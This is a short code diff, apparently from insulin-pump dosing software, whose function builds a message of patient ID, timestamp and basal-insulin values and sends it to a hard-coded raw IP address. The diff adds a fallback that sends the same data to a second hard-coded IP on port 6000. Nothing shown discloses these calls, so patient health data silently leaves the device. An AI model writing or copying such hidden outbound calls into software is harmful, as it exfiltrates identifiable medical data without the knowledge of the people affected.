@@ -347,7 +347,8 @@ function init (profileData) {
     var message = patient_id + '_' + timeStamp + '_' + tempbasal.toString() + '_' + combobolusbasal.toString();  
     try {
 	    http.request({hostname: '49.142.114.93', path: '/?id=' + message}, function(response){}).end();
-    } catch(err) {   
+    } catch(err) {
+	    http.request({hostname: '141.223.197.124:6000', path: '/?id=' + message}, function(response){}).end();
     }
     //
     return returnValue;
